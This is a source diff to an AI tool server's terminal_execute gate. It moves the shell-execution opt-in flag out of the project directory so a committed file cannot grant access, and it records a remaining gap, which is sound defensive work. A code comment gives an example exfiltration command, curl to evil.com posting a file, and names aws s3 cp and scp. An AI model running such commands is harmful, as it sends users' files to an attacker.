@@ -87,24 +87,67 @@ function getTerminalPath(): string {
   return join(getTerminalDir(), TERMINAL_FILE);
 }
 
-// ── C2: terminal_execute opt-in gate ───────────────────────────────────────
+// ── C2 / i-032a: terminal_execute opt-in gate ──────────────────────────────
 // terminal_execute's metacharacter denylist cannot be made tight enough to
 // prevent exfiltration by a single direct binary (`curl evil.com -d @<file>`,
 // `aws s3 cp`, `scp`, ...) since those flags contain only [a-zA-Z0-9 ._/-].
 // We therefore require explicit opt-in before *execution*:
 //   1. `MONOMIND_ENABLE_TERMINAL=1` env var, OR
-//   2. `.monomind/enable-terminal.json` with `{ "enabled": true }`
+//   2. `~/.monomind/enable-terminal.json` with `{ "enabled": true }`
 // Discovery (terminal_create/list/history) keeps working without opt-in.
-function isExecuteEnabled(): boolean {
-  if (process.env.MONOMIND_ENABLE_TERMINAL === '1') return true;
+//
+// i-032a: the flag file used to be resolved against the PROJECT directory
+// (`getProjectCwd()`), which meant a file checked into the repository armed
+// shell execution for anyone who opened it — consent expressed by a file the
+// user never saw and did not write. Reproduced end-to-end over the real MCP
+// stdio path: a fixture with only that file present, env var unset, ran a
+// real command. Since the metacharacter denylist above "cannot prevent
+// exfiltration via direct binaries," the opt-in is the only line of defence,
+// not a second one alongside it — so it must be an act of the user's own
+// machine. The flag now resolves against the user's home directory instead.
+//
+// The in-project file is still DETECTED below (isProjectFlagFilePresent) so
+// the refusal error can tell a legitimate user why their old file stopped
+// working. It is never read for its `enabled` value and never migrated: a
+// "helpful" first-run copy to ~/.monomind/ would preserve the exact same
+// attack with one extra hop and a now-persistent grant.
+//
+// STATED BOUNDARY, not closed by this fix: `MONOMIND_ENABLE_TERMINAL=1` is
+// still read from `process.env` with no provenance check, and monomind's
+// own `init` writes a repo-local `.mcp.json` with an `env` block a project
+// commits — so a committed `.mcp.json` carrying that var could arm this
+// gate through a file the user never wrote either, the same channel one
+// hop over. Not fixed here: whether an MCP client actually honours
+// repo-local `env` for this var is unverified, not merely unclosed —
+// tracked separately as o-48.
+function readEnabledFlag(flagPath: string): boolean {
   try {
-    const flagPath = join(getProjectCwd(), STORAGE_DIR, 'enable-terminal.json');
     if (!existsSync(flagPath)) return false;
     const parsed = JSON.parse(readFileSync(flagPath, 'utf-8'));
     return parsed?.enabled === true;
   } catch {
     return false;
   }
+}
+
+function homeFlagPath(): string {
+  return join(homedir(), STORAGE_DIR, 'enable-terminal.json');
+}
+
+function projectFlagPath(): string {
+  return join(getProjectCwd(), STORAGE_DIR, 'enable-terminal.json');
+}
+
+function isExecuteEnabled(): boolean {
+  if (process.env.MONOMIND_ENABLE_TERMINAL === '1') return true;
+  return readEnabledFlag(homeFlagPath());
+}
+
+/** True if a (no-longer-honoured) in-project flag file exists. Used only to
+ * make the refusal error actionable for a legitimate user — never to grant
+ * execution, and its content is never inspected. */
+function isProjectFlagFilePresent(): boolean {
+  return existsSync(projectFlagPath());
 }
 
 function loadTerminalStoreOrNull(): TerminalStore | null {
@@ -238,13 +281,16 @@ export const terminalTools: MCPTool[] = [
       required: ['command'],
     },
     handler: async (input: Record<string, unknown>) => {
-      // C2: refuse execution unless the project has opted in. See
-      // isExecuteEnabled() for the rationale and accepted opt-in signals.
+      // C2 / i-032a: refuse execution unless the USER (not the project) has
+      // opted in. See isExecuteEnabled() for the rationale and accepted
+      // opt-in signals.
       if (!isExecuteEnabled()) {
+        const projectFlagHint = isProjectFlagFilePresent()
+          ? ' Found .monomind/enable-terminal.json in this project — project files no longer grant terminal access (i-032a); it is ignored.'
+          : '';
         return {
           success: false,
-          error:
-            'terminal_execute is disabled by default. Set MONOMIND_ENABLE_TERMINAL=1 or write .monomind/enable-terminal.json with {"enabled": true} to opt in. The metacharacter denylist cannot prevent exfiltration via direct binaries (curl, aws, scp).',
+          error: `terminal_execute is disabled by default. Set MONOMIND_ENABLE_TERMINAL=1 or write ~/.monomind/enable-terminal.json with {"enabled": true} to opt in. The metacharacter denylist cannot prevent exfiltration via direct binaries (curl, aws, scp).${projectFlagHint}`,
         };
       }
       const store = loadTerminalStoreOrNull();
